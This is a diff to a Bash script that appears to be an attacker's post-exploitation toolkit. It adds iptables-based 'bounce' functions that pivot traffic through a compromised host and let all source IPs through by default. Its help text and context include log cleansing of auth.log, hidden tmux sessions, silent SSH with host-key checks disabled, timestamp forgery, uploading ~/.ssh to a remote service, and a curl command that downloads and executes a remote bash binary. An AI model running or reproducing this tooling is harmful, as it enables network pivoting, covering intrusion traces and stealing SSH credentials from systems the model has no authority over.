@@ -34,8 +34,9 @@ CW="\033[1;37m"
 
 
 ### Functions to keep in memory
-HS_ERR() { echo -e >&2 "${CR}ERROR: ${CDR}$*${CN}"; }
-HS_WARN() { echo -e >&2 "${CY}WARN: ${CDM}$*${CN}"; }
+HS_ERR()  { echo -e >&2  "${CR}ERROR: ${CDR}$*${CN}"; }
+HS_WARN() { echo -e >&2  "${CY}WARN: ${CDM}$*${CN}"; }
+HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }
 xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
 xsu() {
     local name="${1:?}"
@@ -186,6 +187,69 @@ command -v shred >/dev/null || shred() {
     rm -f "${1:?}"
 }
 
+bounceinit() {
+    [[ -n "$_is_bounceinit" ]] && return
+    _is_bounceinit=1
+
+    echo 1 >/proc/sys/net/ipv4/ip_forward
+    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
+    [ $# -le 0 ] && {
+        HS_WARN "Allowing _ALL_ IPs to bounce. Use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM} to limit." 
+        set -- "0.0.0.0/0"
+    }
+    while [ $# -gt 0 ]; do
+        _hs_bounce_src+=("${1}")
+        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+        shift 1
+    done
+    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
+    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+    HS_INFO "Use ${CDC}unbounce${CDM} to remove all bounces."
+}
+
+unbounce() {
+    unset _is_bounceinit
+    local str
+
+    for x in "${_hs_bounce_dst[@]}"; do
+        iptables -t nat -D PREROUTING -p tcp --dport "${x%%-*}" -m mark --mark 1188 -j DNAT --to "${x##*-}"
+    done
+    unset _hs_bounce_dst
+
+    for x in "${_hs_bounce_src[@]}"; do
+        iptables -t mangle -D PREROUTING -s "${x}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+    done
+    unset _hs_bounce_src
+    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
+    iptables -D FORWARD -m mark --mark 1188 -j ACCEPT 2>/dev/null
+    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j MASQUERADE 2>/dev/null
+    iptables -t nat -D POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark 2>/dev/null
+    HS_INFO "DONE. Check with ${CDC}iptables -t mangle -L PREROUTING -vn; iptables -t nat -L -vn; iptables -L FORWARD -vn${CN}"
+}
+
+bounce() {
+    local fport="$1"
+    local dstip="$2"
+    local dstport="$3"
+    [[ $# -lt 3 ]] && {
+        echo -e >&2 "\
+Forward ingress traffic to _this_ host onwards to another host
+Usage: bounce <Local Port> <Destination IP> <Destination Port>
+${CDC} bounce 2222  10.0.0.1  22   ${CN}# Forward 2222 to internal host's port 22
+${CDC} bounce 31336 127.0.0.1 8080 ${CN}# Forward 31336 to server's 8080
+${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53$"
+        return 255
+    }
+    bounceinit
+
+    iptables -t nat -A PREROUTING -p tcp --dport "${fport:?}" -m mark --mark 1188 -j DNAT --to "${dstip:?}:${dstport:?}" || return
+    _hs_bounce_dst+=("${fport}-${dstip}:${dstport}")
+    HS_INFO "Traffic to _this_ host's ${CDY}${fport}${CDM} is now forwarded to ${CDY}${dstip}:${dstport}"
+}
+
 # Keep this seperate because this actually creates data.
 mk() {
     mkdir -p "${XHOME:?}" 2>/dev/null
@@ -214,6 +278,7 @@ hs_exit() {
 hs_init() {
     local a
     local prg="$1"
+    local str
 
     [ -z "$BASH" ] && { HS_WARN "Shell is not BASH. Try:
 ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chmod 700 bash && exec bash -il'"; }
@@ -230,7 +295,8 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
 
     HS_SSH_OPT=()
     command -v ssh >/dev/null && {
-        [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
+        str="$(ssh -V 2>&1)"
+        [[ "$str" == OpenSSH_[67]* ]] && a="no"
         HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
         # HS_SSH_OPT+=("-oUpdateHostKeys=no")
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
@@ -280,10 +346,11 @@ ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
 ${CDC} xsu username                          ${CDM}Switch user
 ${CDC} xtmux                                 ${CDM}Start 'hidden' tmux
 ${CDC} xssh                                  ${CDM}Silently log in to remote host
+${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
 ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
-${CDC} notime <file> rm -f foo.dat           ${CDM}Exec ${CDC}command${CDM} at mtime of <file>
+${CDC} notime <file> rm -f foo.dat           ${CDM}Execute a command at the <file>'s ctime & mtime
 ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
 ${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
 ${CDC} bin                                   ${CDM}Download useful static binaries
